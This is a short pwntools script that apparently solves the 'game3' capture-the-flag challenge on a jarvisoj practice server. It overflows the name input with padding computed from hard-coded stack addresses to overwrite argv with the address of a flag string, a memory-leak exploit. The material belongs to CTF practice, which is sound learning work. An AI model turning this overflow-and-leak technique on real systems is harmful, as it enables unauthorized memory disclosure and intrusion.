from pwn import *

#io = process('./game3')
io = remote('pwn.jarvisoj.com', 9877)
elf = ELF('./game3')
context.log_level = 'debug'

argv_addr = 0x7fffffffdf18
name_addr = 0x7fffffffdd00
flag_addr = 0x600d20
another_flag_addr = 0x400d20

payload = 'a'*(argv_addr - name_addr) + p64(another_flag_addr)
io.recvuntil('name? ')
io.sendline(payload)
io.recvuntil('flag: ')
io.sendline('bb')
print io.recv()
io.interactive()